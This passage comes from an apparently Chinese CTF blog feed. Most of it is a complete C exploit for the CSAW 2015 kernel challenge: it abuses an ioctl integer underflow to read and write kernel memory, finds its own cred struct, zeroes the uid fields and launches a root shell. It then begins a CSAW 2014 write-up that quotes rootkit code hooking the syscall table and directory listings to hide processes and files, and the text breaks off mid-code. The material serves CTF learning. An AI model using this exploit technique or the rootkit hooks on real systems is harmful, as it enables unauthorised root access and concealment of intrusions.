class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE getpagesize()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_OFFSET 0xffff880000000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUF_SIZE PAGE_SIZE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TASK_COMM_LEN 16</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_IOCTL_BASE     0x77617363</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> buf_size;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">grow_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">loff_t</span> index;</span><br><span class="line">    <span class="keyword">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">error</span> <span class="params">( <span class="keyword">char</span> *msg )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hexdump</span> <span class="params">( <span class="keyword">char</span> *addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> length )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; length / <span class="number">16</span>; i++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++ )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%02hhx "</span>, addr[i * <span class="number">16</span> + j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_kernel_memory</span> <span class="params">( <span class="keyword">int</span> fd, <span class="keyword">int</span> id, <span class="keyword">unsigned</span> <span class="keyword">long</span> kaddr, <span class="keyword">void</span> *buf, <span class="keyword">unsigned</span> <span class="keyword">int</span> size )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_channel</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;seek_channel, <span class="number">0</span>, <span class="keyword">sizeof</span>(seek_channel));</span><br><span class="line">    seek_channel.id = id;</span><br><span class="line">    seek_channel.index = kaddr - <span class="number">0x10</span>;</span><br><span class="line">    seek_channel.whence = SEEK_SET;</span><br><span class="line"></span><br><span class="line">    ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;read_channel, <span class="number">0</span>, <span class="keyword">sizeof</span>(read_channel));</span><br><span class="line">    read_channel.id = id;</span><br><span class="line">    read_channel.buf = buf;</span><br><span class="line">    read_channel.count = size;</span><br><span class="line"></span><br><span class="line">    ret = ioctl(fd, CSAW_READ_CHANNEL, &amp;read_channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">write_kernel_null_byte</span> <span class="params">( <span class="keyword">int</span> fd, <span class="keyword">int</span> id, <span class="keyword">unsigned</span> <span class="keyword">long</span> kaddr )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">char</span> null_byte = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_channel</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The write primitive uses strncpy_from_user(), so we can't write full</span></span><br><span class="line"><span class="comment">     * dwords containing a null terminator. The exploit only needs to write</span></span><br><span class="line"><span class="comment">     * zeroes anyhow, so this function just passes a single null byte.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;seek_channel, <span class="number">0</span>, <span class="keyword">sizeof</span>(seek_channel));</span><br><span class="line">    seek_channel.id = id;</span><br><span class="line">    seek_channel.index = kaddr - <span class="number">0x10</span>;</span><br><span class="line">    seek_channel.whence = SEEK_SET;</span><br><span class="line"></span><br><span class="line">    ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;write_channel, <span class="number">0</span>, <span class="keyword">sizeof</span>(write_channel));</span><br><span class="line">    write_channel.id = id;</span><br><span class="line">    write_channel.buf = &amp;null_byte;</span><br><span class="line">    write_channel.count = <span class="keyword">sizeof</span>(null_byte);</span><br><span class="line"></span><br><span class="line">    ret = ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">escalate_creds</span> <span class="params">( <span class="keyword">int</span> fd, <span class="keyword">int</span> id, <span class="keyword">unsigned</span> <span class="keyword">long</span> cred_kaddr )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> tmp_kaddr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The cred struct looks like:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *     atomic_t    usage;</span></span><br><span class="line"><span class="comment">     *     kuid_t      uid;</span></span><br><span class="line"><span class="comment">     *     kgid_t      gid;</span></span><br><span class="line"><span class="comment">     *     kuid_t      suid;</span></span><br><span class="line"><span class="comment">     *     kgid_t      sgid;</span></span><br><span class="line"><span class="comment">     *     kuid_t      euid;</span></span><br><span class="line"><span class="comment">     *     kgid_t      egid;</span></span><br><span class="line"><span class="comment">     *     kuid_t      fsuid;</span></span><br><span class="line"><span class="comment">     *     kgid_t      fsgid;</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * where each field is a 32-bit dword.  Skip the first field and write</span></span><br><span class="line"><span class="comment">     * zeroes over the id fields to escalate to root.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Skip usage field */</span></span><br><span class="line"></span><br><span class="line">    tmp_kaddr = cred_kaddr + <span class="keyword">sizeof</span>(<span class="keyword">int</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Now overwrite the id fields */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (<span class="keyword">sizeof</span>(<span class="keyword">int</span>) * <span class="number">8</span>); i++ )</span><br><span class="line">        write_kernel_null_byte(fd, id, tmp_kaddr + i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gen_rand_str</span> <span class="params">( <span class="keyword">char</span> *str, <span class="keyword">unsigned</span> <span class="keyword">int</span> len )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (len - <span class="number">1</span>); i++ )</span><br><span class="line">        str[i] = (rand() % (<span class="number">0x7e</span> - <span class="number">0x20</span>)) + <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">    str[len - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">( <span class="keyword">int</span> argc, <span class="keyword">char</span> **argv )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret, fd, id;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> offset;</span><br><span class="line">    <span class="keyword">char</span> *addr, *ceiling;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">alloc_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">shrink_channel</span>;</span></span><br><span class="line">    <span class="keyword">char</span> comm[TASK_COMM_LEN];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Set comm to random signature */</span></span><br><span class="line"></span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">    gen_rand_str(comm, <span class="keyword">sizeof</span>(comm));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Generated comm signature: '%s'\n"</span>, comm);</span><br><span class="line"></span><br><span class="line">    ret = prctl(PR_SET_NAME, comm);</span><br><span class="line">    <span class="keyword">if</span> ( ret &lt; <span class="number">0</span> )</span><br><span class="line">        error(<span class="string">"prctl"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Open device */</span></span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">"/dev/csaw"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">        error(<span class="string">"open"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate IPC channel */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;alloc_channel, <span class="number">0</span>, <span class="keyword">sizeof</span>(alloc_channel));</span><br><span class="line">    alloc_channel.buf_size = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    ret = ioctl(fd, CSAW_ALLOC_CHANNEL, &amp;alloc_channel);</span><br><span class="line">    <span class="keyword">if</span> ( ret &lt; <span class="number">0</span> )</span><br><span class="line">        error(<span class="string">"ioctl"</span>);</span><br><span class="line"></span><br><span class="line">    id = alloc_channel.id;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Allocated channel id %d\n"</span>, id);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Shrink channel to -1 */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;shrink_channel, <span class="number">0</span>, <span class="keyword">sizeof</span>(shrink_channel));</span><br><span class="line">    shrink_channel.id = id;</span><br><span class="line">    shrink_channel.size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    ret = ioctl(fd, CSAW_SHRINK_CHANNEL, &amp;shrink_channel);</span><br><span class="line">    <span class="keyword">if</span> ( ret &lt; <span class="number">0</span> )</span><br><span class="line">        error(<span class="string">"ioctl"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Shrank channel to -1 bytes\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Map buffer for leaking kernel memory to */</span></span><br><span class="line"></span><br><span class="line">    addr = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>, BUF_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( addr == MAP_FAILED )</span><br><span class="line">        error(<span class="string">"mmap"</span>);</span><br><span class="line"></span><br><span class="line">    ceiling = addr + BUF_SIZE;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Mapped buffer %p:0x%x\n"</span>, addr, BUF_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Scanning kernel memory for comm signature...\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * We escalate to root by modifying our cred struct in memory.  We first</span></span><br><span class="line"><span class="comment">     * find it by leaking kernel memory one chunk at a time and applying a</span></span><br><span class="line"><span class="comment">     * simple heuristic.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Pointers to our creds reside next to the user-controllable comm field in</span></span><br><span class="line"><span class="comment">     * task_struct:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *     const struct cred __rcu *real_cred;</span></span><br><span class="line"><span class="comment">     *     const struct cred __rcu *cred;</span></span><br><span class="line"><span class="comment">     *     char comm[TASK_COMM_LEN];</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Scan memory for our unique comm string, then verify that the two prior</span></span><br><span class="line"><span class="comment">     * qwords look like kernel pointers.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr = PAGE_OFFSET + offset;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> *search;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* If kernel_addr wraps, we failed to find the comm signature */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( kernel_addr &lt; PAGE_OFFSET )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Failed to find comm signature in memory!\n"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Leak one chunk of kernel memory to userland */</span></span><br><span class="line"></span><br><span class="line">        ret = read_kernel_memory(fd, id, kernel_addr, addr, BUF_SIZE);</span><br><span class="line">        <span class="keyword">if</span> ( ret &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            offset += BUF_SIZE;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Scan for the comm signature in chunk */</span></span><br><span class="line"></span><br><span class="line">        search = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)addr;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ( (<span class="keyword">unsigned</span> <span class="keyword">long</span>)search &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ceiling )</span><br><span class="line">        &#123;</span><br><span class="line">            search = memmem(search, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ceiling - (<span class="keyword">unsigned</span> <span class="keyword">long</span>)search, comm, <span class="keyword">sizeof</span>(comm));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( search == <span class="literal">NULL</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( (search[<span class="number">-2</span>] &gt; PAGE_OFFSET) &amp;&amp; (search[<span class="number">-1</span>] &gt; PAGE_OFFSET ) )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">long</span> real_cred, cred;</span><br><span class="line"></span><br><span class="line">                real_cred = search[<span class="number">-2</span>];</span><br><span class="line">                cred = search[<span class="number">-1</span>];</span><br><span class="line"></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Found comm signature at %p\n"</span>, (<span class="keyword">void</span> *)(kernel_addr + ((<span class="keyword">char</span> *)search - addr)));</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"read_cred = %p\n"</span>, (<span class="keyword">void</span> *)real_cred);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"cred = %p\n"</span>, (<span class="keyword">void</span> *)cred);</span><br><span class="line"></span><br><span class="line">                escalate_creds(fd, id, real_cred);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ( cred != real_cred )</span><br><span class="line">                    escalate_creds(fd, id, cred);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">goto</span> GOT_ROOT;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            search = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span> *)search + <span class="keyword">sizeof</span>(comm));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        offset += BUF_SIZE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">GOT_ROOT:</span><br><span class="line">    <span class="keyword">if</span> ( getuid() != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Attempted to escalate privileges, but failed to get root\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Got root! Enjoy your shell...\n"</span>);</span><br><span class="line"></span><br><span class="line">    execl(<span class="string">"/bin/sh"</span>, <span class="string">"sh"</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blackperl-security.gitlab.io/blog/2018/06/29/2018-06-29-csaw2015-kernelex/" target="_blank" rel="noopener">https://blackperl-security.gitlab.io/blog/2018/06/29/2018-06-29-csaw2015-kernelex/</a><br><a href="http://ilinuxkernel.com/?p=1013" target="_blank" rel="noopener">http://ilinuxkernel.com/?p=1013</a><br><a href="https://blog.csdn.net/chengm8/article/details/17091759" target="_blank" rel="noopener">https://blog.csdn.net/chengm8/article/details/17091759</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;额,还是看代码,先看懂再说.认真分析一遍,一个关于读取,扩大缩小ipc的程序.再看一下漏洞点,其实这是一个整数溢出的漏洞,通过将-1设置为n
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux Kernel Exploitation on Linux-csaw2014</title>
    <link href="https://foyjog.github.io/2018/07/04/Linux-Kernel-Exploitation-on-Linux-csaw2014/"/>
    <id>https://foyjog.github.io/2018/07/04/Linux-Kernel-Exploitation-on-Linux-csaw2014/</id>
    <published>2018-07-04T02:26:49.000Z</published>
    <updated>2018-07-04T03:33:08.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>题目也很长,但是功能也就那一些,这个内核驱动的目的是一个内核的hook,达到rootkit的目的,当然,题目没有做实际的rootkit,只是给了一个形式.<br>关于linux的rootkit可以参考freebuf上的rootkit系列:<a href="http://www.freebuf.com/sectool/105713.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/105713.html</a></p><p>认真查看代码就能够了解,其实这个漏洞是一个比较简单的UAF的漏洞,kmalloc-kfree-kmalloc就能达到提权的目的.</p><h3 id="init函数"><a href="#init函数" class="headerlink" title="init函数"></a>init函数</h3><p>首先查看init函数.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __<span class="function">init <span class="title">i_solemnly_swear_that_i_am_up_to_no_good</span> <span class="params">( <span class="keyword">void</span> )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* Find system call table */</span></span><br><span class="line">    sys_call_table = find_sys_call_table();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Install channel for communication with the rootkit */</span></span><br><span class="line">    orig_sys_shmctl = *(<span class="keyword">void</span> **)(sys_call_table + __NR_shmctl);</span><br><span class="line">    write_ulong(sys_call_table + __NR_shmctl, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)&amp;hook_sys_shmctl);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Hook /proc for hiding processes */</span></span><br><span class="line">    orig_proc_iterate = hook_vfs_iterate(<span class="string">"/proc"</span>, &amp;hook_proc_iterate);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Hook / for hiding files */</span></span><br><span class="line">    orig_root_iterate = hook_vfs_iterate(<span class="string">"/"</span>, &amp;hook_root_iterate);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>题目友好的给出了详细的注释,其实目的就是通过hook sys_call_table来达到控制shmctl系统调用,和控制迭代/proc目录和/目录的目的.<br>观察init中hook_proc_iterate和hook_root_iterate的代码:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hook_proc_iterate</span> <span class="params">( struct file *file, struct dir_context *ctx )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    proc_filldir = ctx-&gt;actor;</span><br><span class="line">    *((<span class="keyword">filldir_t</span> *)&amp;ctx-&gt;actor) = hook_proc_filldir;</span><br><span class="line">    ret = orig_proc_iterate(file, ctx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hook_root_iterate</span> <span class="params">( struct file *file, struct dir_context *ctx )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    root_filldir = ctx-&gt;actor;</span><br><span class="line">    *((<span class="keyword">filldir_t</span> *)&amp;ctx-&gt;actor) = hook_root_filldir;</span><br><span class="line">    ret = orig_root_iterate(file, ctx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里使用hook_proc_filldir和hook_root_filldir勾掉原本的proc_filldir函数.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hook_proc_filldir</span><span class="params">( <span class="keyword">void</span> *__buf, <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">int</span> namelen, <span class="keyword">loff_t</span> offset, u64 ino, <span class="keyword">unsigned</span> d_type )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span 